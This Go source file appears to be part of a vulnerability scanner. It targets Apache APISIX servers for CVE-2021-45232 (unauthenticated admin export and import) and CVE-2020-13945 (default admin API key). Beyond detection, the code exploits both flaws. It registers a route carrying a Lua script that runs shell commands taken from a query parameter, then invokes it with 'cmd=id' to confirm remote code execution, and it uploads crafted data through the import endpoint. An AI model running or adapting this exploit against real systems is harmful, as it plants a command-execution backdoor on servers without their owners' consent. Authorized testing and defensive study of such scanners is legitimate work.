package DataHandle

import (
	"fmt"
	"math/rand"
	url22 "net/url"
	"strings"
	"sync"
	"time"
)

var str string

func CheckAPISIX_Unauth(url string, wg *sync.WaitGroup) {
	defer wg.Done()
	urlnew, err := url22.Parse(url)
	if err != nil {
		return
	}
	var url2 string
	var urls []string
	if strings.Contains(urlnew.Host, ":") {
		urls = append(urls, url)
		if strings.Split(urlnew.Host, ":")[1] != "9000" {
			urls = append(urls, strings.Split(url, urlnew.Host)[0]+strings.Split(urlnew.Host, ":")[0]+":9000")
		}
		url2 = strings.Split(url, urlnew.Host)[0] + strings.Split(urlnew.Host, ":")[0] + ":9080"
	}
	for _, url := range urls {
		str = RandString(6)
		header := map[string]string{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36", "Authorization": "1111"}
		resp, respbody, reqbody := RequestHead("GET", url+"/apisix/admin/migrate/export", nil, header)
		if resp == nil {
			continue
		}

		if resp.StatusCode == 200 && strings.Contains(respbody, "\"Routes\":[") && strings.Contains(respbody, "{\"Counsumers\":[") {

			fmt.Printf("[- %v -]存在Apache APISIX 未授权漏洞（CVE-2021-45232）;\n\n[ -- Poc -- ]\n请求数据包：\n---------------------------------------------------------------------------------------------------------------------------------------------\n%v\n---------------------------------------------------------------------------------------------------------------------------------------------\n", url, reqbody)
			content := Gen()
			if err != nil {
				continue
			}
			header1 := map[string]string{"cmd": "id", "Content-Type": "text/data"}
			resp1, _ := NewfileUploadRequest(url+"/apisix/admin/migrate/import", "file", "data", content, nil, header)
			//body, _ := ioutil.ReadAll(resp1.Body)
			//fmt.Println(string(body))
			resp2, respbody2, reqbody2 := RequestHead("POST", url2+"/"+str, nil, header1)
			if resp1 == nil || resp2 == nil {
				return
			}

			if strings.Contains(respbody2, "uid=") && strings.Contains(respbody2, "gid=") {
				fmt.Printf("[- %v -]存在Apache APISIX 未授权漏洞（CVE-2021-45232）可getshell;\n\n[ -- Poc -- ]\n请求数据包：\n---------------------------------------------------------------------------------------------------------------------------------------------\n%v\n---------------------------------------------------------------------------------------------------------------------------------------------\n", url, reqbody2)

			}
		}
	}

}
func CheckDefaultkey(url string, wg *sync.WaitGroup) {
	defer wg.Done()
	var url2 string
	urlnew, err := url22.Parse(url)
	if err != nil {
		return
	}
	if strings.Contains(url, ":") {
		url2 = strings.Split(url, urlnew.Host)[0] + strings.Split(urlnew.Host, ":")[0] + ":9080"
	}
	header := map[string]string{"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36", "X-API-KEY": "edd1c9f034335f136f87ad84b625c8f1"}
	resp, respbody, reqbody := RequestHead("GET", url2+"/apisix/admin/routes", nil, header)
	if resp == nil {
		return
	}
	if resp.StatusCode == 200 && strings.Contains(respbody, "\"key\":\"\\/apisix\\/routes\\/") {

		fmt.Printf("[- %v -]存在Apache APISIX 默认密钥漏洞-CVE-2020-13945;\n\n[ -- Poc -- ]\n请求数据包：\n---------------------------------------------------------------------------------------------------------------------------------------------\n%v\n---------------------------------------------------------------------------------------------------------------------------------------------\n", url, reqbody)

		RequestHead("POST", url2+"/apisix/admin/routes", strings.NewReader("{\n    \"uri\": \"/attack\",\n\"script\": \"local _M = {} \\n function _M.access(conf, ctx) \\n local os = require('os')\\n local args = assert(ngx.req.get_uri_args()) \\n local f = assert(io.popen(args.cmd, 'r'))\\n local s = assert(f:read('*a'))\\n ngx.say(s)\\n f:close()  \\n end \\nreturn _M\",\n    \"upstream\": {\n        \"type\": \"roundrobin\",\n        \"nodes\": {\n            \"example.com:80\": 1\n        }\n    }\n}"), header)

		_, respbody1, reqbody1 := RequestHead("GET", url2+"/attack?cmd=id", nil, header)
		if strings.Contains(respbody1, "uid=") && strings.Contains(respbody1, "gid=") {
			fmt.Printf("[- %v -]存在Apache APISIX 默认密钥漏洞-CVE-2020-13945 可getshell;\n\n[ -- Poc -- ]\n请求数据包：\n---------------------------------------------------------------------------------------------------------------------------------------------\n%v\n---------------------------------------------------------------------------------------------------------------------------------------------\n", url, reqbody1)
		}
	}

}
func RandString(len int) string {
	r := rand.New(rand.NewSource(time.Now().Unix()))
	bytes := make([]byte, len)
	for i := 0; i < len; i++ {
		b := r.Intn(26) + 65
		bytes[i] = byte(b)
	}
	return string(bytes)
}
